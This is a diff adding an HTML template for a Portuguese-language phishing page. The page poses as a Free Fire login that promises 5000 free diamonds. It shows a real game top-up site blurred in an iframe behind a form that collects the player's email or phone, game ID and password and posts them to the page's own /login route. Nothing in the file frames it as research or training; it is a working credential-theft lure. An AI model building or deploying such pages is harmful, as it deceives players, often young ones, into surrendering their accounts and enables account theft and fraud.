@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Free Fire - Resgate Diamantes</title>
+  <style>
+    /* Reset básico */
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+      font-family: 'Trebuchet MS', sans-serif;
+    }
+    html, body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      background-color: #1a1a1a;
+      color: #f0f0f0;
+    }
+    iframe {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 1;
+    }
+    /* Overlay com desfoque sobre o iframe */
+    #overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(26, 26, 26, 0.3);
+      backdrop-filter: blur(8px);
+      z-index: 2;
+      pointer-events: none;
+    }
+    header, main {
+      position: relative;
+      z-index: 3;
+      max-width: 900px;
+      margin: 20px auto;
+      text-align: center;
+      background: rgba(26, 26, 26, 0.7);
+      padding: 20px;
+      border-radius: 10px;
+      color: #f0f0f0;
+      text-shadow: 0 0 5px #000;
+    }
+    img {
+      max-width: 150px;
+      margin-bottom: 15px;
+    }
+    h2 {
+      color: #d91c1c;
+      margin-bottom: 15px;
+      text-shadow: 1px 1px 2px #000;
+    }
+    p {
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+    form {
+      max-width: 350px;
+      margin: 0 auto;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 10px;
+      margin-bottom: 15px;
+      border: 2px solid #d91c1c;
+      border-radius: 5px;
+      background-color: #222;
+      color: #f0f0f0;
+      font-size: 1rem;
+      transition: border-color 0.3s ease;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #ff3b3b;
+      outline: none;
+    }
+    button {
+      background-color: #d91c1c;
+      border: none;
+      color: #fff;
+      font-weight: bold;
+      font-size: 1.1rem;
+      padding: 12px 25px;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: background-color 0.3s ease;
+      width: 100%;
+    }
+    button:hover {
+      background-color: #a71414;
+    }
+  </style>
+</head>
+<body>
+  <iframe src="https://moztopup.com" allowfullscreen></iframe>
+  <div id="overlay"></div>
+
+  <header>
+    <!-- Use url_for para imagens no static -->
+    <img src="{{ url_for('static', filename='imagens/ffLogo.png') }}" alt="Logo Free Fire" />
+    <h2>Faça Login para Resgatar Seus Diamantes!</h2>
+  </header>
+  <main>
+    <p>Conecte sua conta Free Fire (ou Facebook) para ganhar 5000 Diamantes!</p>
+    <!-- Form com method POST e action para enviar para a rota /login -->
+    <form id="loginForm" method="POST" action="{{ url_for('login') }}">
+      <input type="text" name="email_or_phone" placeholder="Email ou Telefone" required />
+      <input type="text" name="freefire_id" placeholder="Seu ID do Free Fire (opcional)" />
+      <input type="password" name="senha_freefire" placeholder="Senha do Free Fire" required />
+      <button type="submit">Entrar</button>
+    </form>
+  </main>
+</body>
+</html>
